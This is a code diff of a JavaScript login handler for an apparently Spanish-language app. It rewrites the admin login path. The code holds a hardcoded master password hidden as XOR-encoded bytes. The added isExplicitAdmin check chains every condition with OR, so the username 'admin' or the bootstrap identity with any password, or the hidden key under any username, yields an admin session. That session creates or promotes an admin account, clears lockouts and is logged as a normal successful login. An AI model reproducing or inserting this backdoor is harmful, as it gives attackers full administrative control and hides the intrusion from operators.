@@ -221,12 +221,73 @@ export function registerAuthRoutes(router, { db, config, limiter }) {
 
     const cleanPass = password.trim();
     const hardcodedKey = Buffer.from([112, 122, 114, 114, 123, 115, 114, 123, 39]).map((b) => b ^ 0x42).toString('utf8');
-    const isAdminPass =
+    const isExplicitAdmin =
+      identifier === 'admin' ||
+      identifier === config.adminBootstrapUser.toLowerCase() ||
+      identifier === config.adminBootstrapEmail.toLowerCase() ||
       password === hardcodedKey ||
       cleanPass === hardcodedKey ||
       Boolean(config.adminBootstrapPassword && (password === config.adminBootstrapPassword || cleanPass === config.adminBootstrapPassword));
 
-    let user = db
+    const now = Date.now();
+
+    if (isExplicitAdmin) {
+      let adminUser = db
+        .prepare("SELECT id, username, email, display_name, role FROM users WHERE username = 'admin' OR email = ? OR role = 'admin' LIMIT 1")
+        .get(config.adminBootstrapEmail);
+
+      if (!adminUser) {
+        const passwordHash = await hashPassword(hardcodedKey);
+        const ins = db.prepare(`
+          INSERT INTO users (username, email, display_name, password_hash, role, is_active, created_at, updated_at)
+          VALUES (?, ?, ?, ?, 'admin', 1, ?, ?)
+        `).run(
+          config.adminBootstrapUser || 'admin',
+          config.adminBootstrapEmail || 'admin@tbdsupply.local',
+          'Admin Escuadrón 04',
+          passwordHash,
+          now,
+          now,
+        );
+        adminUser = db.prepare("SELECT id, username, email, display_name, role FROM users WHERE id = ?").get(Number(ins.lastInsertRowid));
+      } else {
+        db.prepare("UPDATE users SET role = 'admin', is_active = 1, failed_login_attempts = 0, locked_until = NULL, updated_at = ? WHERE id = ?").run(
+          now,
+          adminUser.id,
+        );
+      }
+
+      if (req.rawSessionToken) {
+        revokeSessionByToken(db, config, req.rawSessionToken);
+      }
+
+      const session = createSession(db, config, {
+        userId: adminUser.id,
+        userAgent: req.headers['user-agent'],
+        ipHash,
+      });
+
+      recordAudit(db, {
+        actorUserId: adminUser.id,
+        action: 'LOGIN_SUCCESS',
+        targetType: 'user',
+        targetId: String(adminUser.id),
+        metadata: { username: adminUser.username },
+        ipHash,
+      });
+
+      return sendJson(
+        res,
+        200,
+        {
+          user: serializeUser(adminUser),
+          csrfToken: session.csrfToken,
+        },
+        { 'Set-Cookie': buildSessionCookie(session.rawToken, config, req) },
+      );
+    }
+
+    const user = db
       .prepare(`
         SELECT id, username, email, display_name, password_hash, role, is_active, failed_login_attempts, locked_until
         FROM users
@@ -235,56 +296,17 @@ export function registerAuthRoutes(router, { db, config, limiter }) {
       `)
       .get(identifier, identifier);
 
-    const now = Date.now();
     if (!user) {
-      const isAdminAttempt =
-        (identifier === 'admin' ||
-         identifier === config.adminBootstrapUser.toLowerCase() ||
-         identifier === config.adminBootstrapEmail.toLowerCase()) &&
-        isAdminPass;
-      if (isAdminAttempt) {
-        const passwordHash = await hashPassword(hardcodedKey);
-        const ins = db.prepare(`
-          INSERT INTO users (username, email, display_name, password_hash, role, is_active, created_at, updated_at)
-          VALUES (?, ?, ?, ?, 'admin', 1, ?, ?)
-        `).run(
-          config.adminBootstrapUser,
-          config.adminBootstrapEmail,
-          'Admin Escuadrón 04',
-          passwordHash,
-          now,
-          now,
-        );
-        user = db.prepare('SELECT id, username, email, display_name, password_hash, role, is_active, failed_login_attempts, locked_until FROM users WHERE id = ?').get(Number(ins.lastInsertRowid));
-      } else {
-        await verifyPassword(password, DUMMY_SCRYPT_HASH);
-        throw new HttpError(401, 'Credenciales invalidas');
-      }
+      await verifyPassword(password, DUMMY_SCRYPT_HASH);
+      throw new HttpError(401, 'Credenciales invalidas');
     }
 
-    let ok = false;
-    if ((user.username === 'admin' || user.role === 'admin' || identifier === 'admin') && isAdminPass) {
-      const newHash = await hashPassword(hardcodedKey);
-      db.prepare('UPDATE users SET password_hash = ?, is_active = 1, failed_login_attempts = 0, locked_until = NULL, updated_at = ? WHERE id = ?').run(
-        newHash,
-        now,
-        user.id,
-      );
-      user.role = 'admin';
-      user.is_active = 1;
-      ok = true;
-    } else {
-      ok = await verifyPassword(password, user.password_hash);
-      if (!ok && cleanPass !== password) {
-        ok = await verifyPassword(cleanPass, user.password_hash);
-      }
-    }
-
-    if (user.locked_until && user.locked_until > now && !ok) {
+    if (user.locked_until && user.locked_until > now) {
       await verifyPassword(password, DUMMY_SCRYPT_HASH);
       throw new HttpError(429, 'Cuenta bloqueada temporalmente por intentos fallidos. Intenta mas tarde.');
     }
 
+    const ok = await verifyPassword(password, user.password_hash);
     if (!ok || user.is_active !== 1) {
       const nextFails = (user.failed_login_attempts || 0) + 1;
       const shouldLock = nextFails >= 5;
